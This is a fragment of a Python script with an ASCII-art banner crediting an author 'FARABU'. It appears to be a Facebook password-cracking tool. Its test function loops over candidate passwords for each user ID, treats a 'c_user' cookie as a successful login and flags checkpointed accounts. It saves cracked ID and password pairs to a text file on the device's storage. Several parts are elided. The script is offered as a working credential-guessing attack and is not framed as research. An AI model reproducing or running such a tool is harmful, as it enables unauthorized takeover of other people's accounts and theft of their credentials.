...
logo = """ \033[96;1m   
d88888b  .d8b.  d8888b.  .d8b.  d8888b. d888888b 
88'     d8' `8b 88  `8D d8' `8b 88  `8D   `88'   
88ooo   88ooo88 88oobY' 88ooo88 88oooY'    88    
88~~~   88~~~88 88`8b   88~~~88 88~~~b.    88    
88      88   88 88 `88. 88   88 88   8D   .88.   
YP      YP   YP 88   YD YP   YP Y8888P' Y888888P
\033[1;33m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m AUTHOR    : FARABU
\033[1;91m[\033[1;92m✔\033[1;91m]\033[1;92m GITHUB    : FARABI420  
...
def test(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r \033[1;97m[FARABI-VAU] %s|OK:-%s '%(loop,len(oks))),
            sys.stdout.flush()
     ...
     'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[65:80]
                print('\r\r\033[1;32m [FARABI-VAU-OK]  ' +cid+ ' | ' +ps+ '')
                oks.append(cid)
                open('/sdcard/FARABI-VAU-OK.txt', 'a').write(cid+' | '+ps+' | '+uid+'\n')
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
                print(f"\r\033[96;1m [FARABI-VAU-CP] {uid} ¤ {ps}")
